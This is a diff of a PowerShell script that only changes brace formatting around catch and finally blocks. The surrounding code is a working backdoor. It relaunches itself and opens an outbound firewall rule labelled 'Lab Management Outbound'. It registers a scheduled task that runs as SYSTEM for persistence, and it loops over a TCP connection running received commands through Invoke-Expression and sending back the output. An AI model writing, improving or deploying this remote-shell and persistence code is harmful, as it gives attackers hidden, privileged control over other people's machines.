@@ -28,7 +28,8 @@ if ($PSCommandPath -ne ${FullPath}) {
         
         # Kill loader session to prevent terminal hang
         Stop-Process -Id $PID 
-    } catch {
+    }
+    catch {
         # Silent failure
     }
 }
@@ -40,7 +41,8 @@ try {
     if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
         New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
     }
-} catch {
+}
+catch {
     # Proceed without admin-level mods
 }
 
@@ -54,7 +56,8 @@ try {
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
     }
-} catch {
+}
+catch {
     # Silent failure
 }
 
@@ -86,17 +89,20 @@ while ($true) {
 
             $output = try {
                 Invoke-Expression $command 2>&1 | Out-String
-            } catch {
+            }
+            catch {
                 "Error: " + $_.Exception.Message
             }
 
             if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
             $writer.Write($output)
         }
-    } catch {
+    }
+    catch {
         # Wait 10 seconds before retrying connection
         Start-Sleep -Seconds 10
-    } finally {
+    }
+    finally {
         if ($null -ne $client) { $client.Close() }
         if ($null -ne $reader) { $reader.Close() }
         if ($null -ne $writer) { $writer.Close() }
